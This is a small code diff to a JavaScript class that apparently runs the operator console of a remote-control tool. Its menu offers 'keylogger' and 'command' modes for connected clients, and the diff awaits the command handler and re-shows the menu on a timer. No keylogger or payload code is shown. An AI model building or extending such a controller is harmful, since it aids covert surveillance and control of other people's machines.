@@ -17,7 +17,7 @@ class HandleClientCommands
         let strQuestion = "";
         for(let option in HandleClientCommands.menuOptions)
         {
-            strQuestion += `Write ${HandleClientCommands.menuOptions[option]} for ${option}\n`;
+            strQuestion += `--> Write ${HandleClientCommands.menuOptions[option]} for ${option}\n`;
         }
 
         // Choose what mode to operate in
@@ -29,11 +29,16 @@ class HandleClientCommands
                 this.caseKeylogger();
                 break;
             case "command":
-                this.caseCommand();
+                await this.caseCommand();
                 break;
             default:
                 console.log("Message not configured!");   
         }
+
+        setTimeout(() => {
+            this.menu();
+        }, 
+        1000);
     }
 
     async caseCommand()
